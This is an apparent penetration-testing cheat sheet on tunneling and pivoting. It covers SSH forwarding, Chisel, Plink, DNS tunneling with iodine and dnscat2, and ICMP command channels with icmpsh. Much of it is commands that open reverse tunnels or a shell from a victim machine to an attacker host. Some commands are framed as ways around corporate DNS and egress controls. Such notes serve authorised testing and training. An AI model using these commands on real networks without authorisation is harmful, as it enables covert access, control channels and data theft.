# Port Redirection & Tunneling

## Port Redirection & Tunneling

We use port redirection and/or tunneling when we want to forward a port that's listening only on localhost \(127.0.0.1\). 

## **SSH** <a id="ssh"></a>

We can use SSH to perform port redirection and tunneling

Key Concepts to avoid confusion:

* -L = Your host port \(L = Local\)
* -R = Your host port \(R = Remote\)
* &lt;IP&gt;:3306 = The IP and PORT from the target

### Local Port Forwarding

Things to consider:

* Have SSH access with low privileges? 
* There are some ports open internally? 

Try local port forwarding:

```text
ssh –L 3306:<IP>:3306 user@$target_ip
```

### Remote Port Forwarding

Things to consider:

* No SSH Access but limited shell? 
* Also, some weird port is open on local-host? 

Try remote port forwarding:

```text
ssh –R 3306:localhost:3306 root@kali_ip
ssh –R 3306:localhost:3306 -o "UserKnownHostFile=/dev/null" -o "UserHostKeyChecking=no" root@kali_ip
```

Connect to the tunneled port:

```text
#Verify with nc
nc -vvv localhost 3306

#If mysql
mysql -u username -p -h 127.0.0.1 -P 3306
```

### Dynamic Port Forwarding \(Socks4\)

Dynamic Port Forwarding from victim machine\(Socks Proxy\):

```text
ssh -D 8080 -f -N user@$target_ip
```

With Dynamic Port Forwarding we can access/browse any IP range of the victim machine. We just need to configure proxychains.conf as follows:

```text
nano /etc/proxychains.conf
...
.
.
....
socks4  127.0.0.1 8080
```

Now we can use any application through proxychains… such as:

```text
proxychains firefox
proxychains nmap -sT -Pn -p139,445 $ip
```

#### SOCKS Proxy

```text
ssh -D8080 [user]@[host]

ssh -N -f -D 9000 [user]@[host]
-f : ssh in background
-N : do not execute a remote command
```

Cool Tip: Konami SSH Port forwarding

```text
[ENTER] + [~C]
```

#### Local Port Forwarding

```text
ssh -L [bindaddr]:[port]:[dsthost]:[dstport] [user]@[host]
```

#### Remote Port Forwarding

```text
ssh -R [bindaddr]:[port]:[localhost]:[localport] [user]@[host]
ssh -R 3389:10.1.1.224:3389 root@10.11.0.32
```

## SSHUTTLE

You can **tunnel** via **ssh** all the **traffic** to a **subnetwork** through a host. For example, forwarding all the traffic going to 10.10.10.0/24

```text
pip install sshuttlesshuttle -r user@host 10.10.10.10/24
```

## Plink

Remote port forwarding using Plink. This is needed when we don’t have access to a specific port on the target machine. From the target machine we can execute this command:

```text
plink.exe -ssh -l kali_user -pw kali_password -R $kali_ip:445:127.0.0.1:445 $kali_ip
```

## Chisel <a id="chisel"></a>

Chisel can be downloaded here: [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)

 You need to use the **same version for the client and the server**.

### Windows Port Forwarding <a id="socks"></a>

```text
./chisel server -p 8080 --reverse
./chisel-x64.exe client 10.10.14.3:8080 R:socks
```

### Linux Port forwarding <a id="port-forwarding"></a>

```text
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505
```

## DNS Tunneling

### Detection

Can we resolve internal domain?

```text
nslookup acmebank.local
Server:    192.168.1.1
Address:  192.168.1.153

Name:  acmebank.local
Address: 192.168.10.12
```

Can we resolve an external domain through the company DNS server? \(if yes, we can perform DNS tunneling\)

```text
nslookup google.com
Server:    192.168.1.1
Address:  192.168.1.153

Non-authoritative answer:
Address: 216.58.209.14
Name:  google.com
```

Can we communicate with external DNS? \(another finding\)

```text
nslookup pentest.blog 8.8.8.8
Server: 8.8.8.8
Address: 8.8.8.853

Non-authoritative answer:
Name: pentest.blog
Address: 104.27.169.40
Name: pentest.blog
Address: 104.27.168.40
```

### Attack

#### iodine

iodine creates 2 tun adaptors and sends data between these 2 adapters by tunneling like a DNS query

Server-Side:

```text
iodined -f -c -P <pass> <IP address> <domain> 
eg: 
iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
```

Client-Side:

```text
iodine -f -P <pass> <domain> r 
eg: 
iodine -f -P P@ssw0rd tunneldomain.com -r
```

#### dnscat2

Server-Side:

```text
ruby ./dnscat2.rb tunneldomain.com
```

Client-Side:

```text
./dnscat2 tunneldomain.com
```

```text
dnscat2> session -i 1
command session (debian) 1> listen 127.0.0.1:8080 10.0.0.20:80 
```

## ICMP Tunneling

ICMP Tunneling can be done by changing the Payload Data so it will contain the data we want to send.

### icmpsh

It does not require administrative privileges. C2-channel, slave runs on Windows \(host\) and master runs on Kali \(attacker\)

### Attack

Clone or download icmpsh:

```text
git clone https://github.com/inquisb/icmpsh.git
```

Master - Kali:

```text
sysctl -w net.ipv4.icmp_echo_ignore_all=1 
cd icmpsh
./icmpsh_m.py <attacker’s-IP> <target-IP>
```

Slave - Windows

```text
icmpsh.exe -t <attacker’s-IP>
```

Master - Kali

```text
./icmpsh_m.py <attacker’s-IP> <target-IP>
```

We can use wireshark to see commands run in the data

### icmptunnel

Server-side:

```text
git clone https://github.com/jamesbarlow/icmptunnel.git 
cd icmptunnel
make
```

ICMP echo reply disable.

```text
echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all
```

ICMP tunnel run in server-side and set IP to tun0 adaptor

```text
./icmptunnel -s
Ctrlz
bg
/sbin/ifconfig tun0 10.0.0.1 netmask 255.255.255.0 ifconfig
```

Client-side:

```text
git clone https://github.com/jamesbarlow/icmptunnel.git 
cd icmptunnel
make
```

ICMP echo reply disable.

```text
echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all 
./icmptunnel 192.168.1.108
ctrl z
/sbin/ifconfig tun0 10.0.0.2 netmask 255.255.255.0
```

Connect to ssh using ICMP from server to client using tun interface

```text
ssh username@10.0.0.1
```

## VNC Tunneling via SSH

VNC is an interactive GUI program. We can use ssh tunneling and proxychains to connect to the local listener.

```text
root@kali:~/hackthebox/poison-10.10.10.84# tail /etc/proxychains.conf
#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4  127.0.0.1 8081
root@kali:~/hackthebox/poison-10.10.10.84# ssh charix@10.10.10.84 -D 8081

root@kali:~/hackthebox/poison-10.10.10.84# proxychains vncviewer 127.0.0.1:5901 -passwd secret
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:8081-<><>-127.0.0.1:5901-<><>-OK
Connected to RFB server, using protocol version 3.8
Enabling TightVNC protocol extensions
Performing standard VNC authentication
Authentication successful
Desktop name "root's X desktop (Poison:1)"
VNC server default format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Using default colormap which is TrueColor.  Pixel format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Same machine: preferring raw encoding
```

## References

Most of the tunneling techniques covered here were extracted from here:

{% embed url="https://github.com/areyou1or0/Tunneling" %}







###  <a id="vpn-tunnel"></a>

